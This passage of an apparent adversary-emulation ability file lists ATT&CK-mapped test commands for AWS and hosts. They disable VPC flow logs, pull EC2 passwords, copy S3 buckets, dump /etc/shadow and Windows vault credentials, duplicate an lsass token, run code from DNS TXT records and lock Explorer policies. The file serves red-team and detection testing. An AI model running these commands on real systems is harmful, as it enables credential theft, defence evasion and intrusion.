detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Cloud Logs", "ability_id": "a26601ea01296a3a01c3854340d1c396", "technique_id": "T1562.008", "tactic": "defense-evasion", "requirements": [], "name": "AWS - Remove VPC Flow Logs using Stratus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1552/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -f $PathToAtomicsFolder/T1552/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1552/src; echo \"starting warmup\"; ./stratus warmup aws.credential-access.ec2-get-password-data; echo \"starting detonate\"; ./stratus detonate aws.credential-access.ec2-get-password-data --force", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1552/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f $PathToAtomicsFolder/T1552/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1552/src; echo \"starting warmup\"; ./stratus warmup aws.credential-access.ec2-get-password-data; echo \"starting detonate\"; ./stratus detonate aws.credential-access.ec2-get-password-data --force", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials", "ability_id": "33f718d05dddc362f6f83802b8b89e93", "technique_id": "T1552", "tactic": "credential-access", "requirements": [], "name": "AWS - Retrieve EC2 Password Data using stratus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["aws s3 rb s3://redatomic-test2 --force ; rm -rf /tmp/redatomic-test2"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "aws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data from Cloud Storage Object", "ability_id": "f1bd28014dc55d1849088a8e69a0b4ca", "technique_id": "T1530", "tactic": "collection", "requirements": [], "name": "AWS - Scan for Anonymous Access to S3", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Cloud Storage Object Discovery", "ability_id": "0667a2ac10e4acb40163d61b0d923ad6", "technique_id": "T1619", "tactic": "discovery", "requirements": [], "name": "AWS S3 Enumeration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "function nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "e2e6f33cf77d10e3c82c244014da20c5", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Abuse Nslookup with DNS Records", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "/etc/passwd file is accessed in Linux environments\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "info.created"}]}], "cleanup": ["rm -f /tmp/T1003.008.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow", "ability_id": "bdd7294d26bde5f398e6ec5d846cdee5", "technique_id": "T1003.008", "tactic": "credential-access", "requirements": [{"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Access /etc/passwd (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "/etc/shadow file is accessed in Linux environments\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "info.created"}]}], "cleanup": ["rm -f /tmp/T1003.008.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo cat /etc/shadow > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow", "ability_id": "af30d8506a8aba7a022b687261d22541", "technique_id": "T1003.008", "tactic": "credential-access", "requirements": [{"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Access /etc/shadow (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump /etc/passwd and /etc/shadow using ed\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["07a87d_t1059.003_cmd.cmd"], "parsers": [], "cleanup": ["rm -f /tmp/T1003.008.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo -e \\\"e /etc/passwd\\\\n,p\\\\ne /etc/shadow\\\\n,p\\\\n\\\" | ed > /tmp/T1003.008.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow", "ability_id": "9e771275f11328252ac359ee3cc2f32c", "technique_id": "T1003.008", "tactic": "credential-access", "requirements": [], "name": "Access /etc/{shadow,passwd} with a standard bin that's not cat", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump /etc/passwd and /etc/shadow using bash builtins\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1003.008.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "function testcat(){ echo \"$(< $1)\"; }; testcat /etc/passwd > /tmp/T1003.008.txt; testcat /etc/shadow > /tmp/T1003.008.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow", "ability_id": "838fcd628b987b82c6dff35cd275f916", "technique_id": "T1003.008", "tactic": "credential-access", "requirements": [], "name": "Access /etc/{shadow,passwd} with shell builtins", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "vaultcmd /listcreds:\"Windows Credentials\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Windows Credential Manager", "ability_id": "10ce4e4c0a8d29ead8968da8156d8358", "technique_id": "T1555.004", "tactic": "credential-access", "requirements": [], "name": "Access Saved Credentials via VaultCmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}; $PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create Process with Token", "ability_id": "6fae357c43fd211c9d39fe7583281bf0", "technique_id": "T1134.002", "tactic": "multiple", "requirements": [], "name": "Access Token Manipulation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "type C:\\Windows\\Panther\\unattend.xml && type C:\\Windows\\Panther\\Unattend\\unattend.xml", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "780cde60c956ccbff24c43ff7b7e70ea", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "Access unattend.xml", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The net utility is executed via cmd to enumerate domain user accounts.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Account Discovery (all)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user #{domain.user.name} /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user #{domain.user.name} /domain", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "364ea817-bbb9-4083-87dd-94b9dba45f6f", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Account Discovery (targeted)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Use PowerView to query the Active Directory server to determine remote admins", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.netlocalgroup", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_admin", "target": "domain.user.name", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_admin"}], "module": "plugins.stockpile.app.requirements.not_exists"}, {"relationship_match": [{"source": "backup.admin.ability", "edge": "first_failed"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "isAccessibleFrom"}], "module": "plugins.stockpile.app.requirements.reachable"}], "name": "Account-type Admin Enumerator", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user guest /active:no"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user guest /active:yes", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Default Accounts", "ability_id": "4e0f69a36c9e0b956f08afd5824972ce", "technique_id": "T1078.001", "tactic": "multiple", "requirements": [], "name": "Activate Guest Account", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "fa4ba6a06b4a5cd955ea5a60fae24281", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoClose Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "cab7b85611a290c0769546bfa9d6f962", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoControlPanel Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "e74d2fb4ef5fa6c766a4151554033697", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoDesktop Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "257313a3c93e3bb7dfb60d6753b09e34", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoFileMenu Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "34041639e6e501856ecaf5969ee29c76", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoFind Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "7fe6a66d03f4dbfc022609ba311c2b11", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "fd992e8ecfdac9b56dd6868904044827", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoRun Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "ba6f6214dbd17c54001e0a163b60f151", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoSetTaskbar Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- 